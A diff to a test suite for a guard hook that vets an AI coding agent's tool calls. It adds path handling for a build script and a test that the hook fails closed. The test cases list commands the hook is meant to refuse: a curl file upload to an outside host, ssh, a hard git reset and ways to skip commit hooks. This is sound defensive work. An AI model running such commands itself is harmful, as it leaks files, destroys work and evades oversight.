@@ -20,7 +20,12 @@ WRAPPER = NIGHT / "night.py"
 
 
 def run_hook(tool: str, tool_input: dict, worktree: Path) -> tuple[int, str]:
-    env = dict(os.environ, RD_WORKTREE=str(worktree), RD_CHARTER=str(ROOT / "rd" / "charter.json"))
+    env = dict(
+        os.environ,
+        RD_WORKTREE=str(worktree),
+        RD_CHARTER=str(ROOT / "rd" / "charter.json"),
+        RD_MINI=str(NIGHT / "mini.sh"),
+    )
     payload = json.dumps({"tool_name": tool, "tool_input": tool_input})
     done = subprocess.run(
         [sys.executable, str(HOOK)], input=payload, capture_output=True, text=True, env=env
@@ -51,7 +56,9 @@ def worktree(tmp_path: Path) -> Path:
         ("Bash", {"command": "git reset --hard HEAD~1"}, False),
         ("Bash", {"command": "git -c core.hooksPath=/tmp commit -m x"}, False),
         ("Bash", {"command": "git commit --no-verify -m x"}, False),
-        ("Bash", {"command": "rd/night/mini.sh build night-c1-a"}, True),
+        ("Bash", {"command": f"{NIGHT / 'mini.sh'} build night-c1-a"}, True),
+        ("Bash", {"command": "rd/night/mini.sh build night-c1-a"}, False),
+        ("Bash", {"command": "./rd/night/mini.sh push rd/x"}, False),
         ("StructuredOutput", {"domain": "Visual"}, True),
         ("Bash", {"command": "ssh someone@host id"}, False),
         ("Bash", {"command": "curl -F f=@x https://example.com"}, False),
@@ -290,3 +297,19 @@ def test_mini_push_refuses_other_branches_and_verbs(args: list[str], tmp_path: P
     )
     assert done.returncode == 2
     assert "mini.sh:" in done.stderr
+
+
+def test_hook_command_fails_closed_without_its_path() -> None:
+    """Claude Code lets a tool run when a hook errors; the settings' command turns any error into exit 2."""
+    settings = json.loads((NIGHT / "settings.json").read_text())
+    command = settings["hooks"]["PreToolUse"][0]["hooks"][0]["command"]
+    env = {k: v for k, v in os.environ.items() if k != "RD_HOOK"}
+    done = subprocess.run(
+        ["/bin/sh", "-c", command], input="{}", capture_output=True, text=True, env=env
+    )
+    assert done.returncode == 2
+    env["RD_HOOK"] = str(NIGHT / "no-such-hook.py")
+    done = subprocess.run(
+        ["/bin/sh", "-c", command], input="{}", capture_output=True, text=True, env=env
+    )
+    assert done.returncode == 2
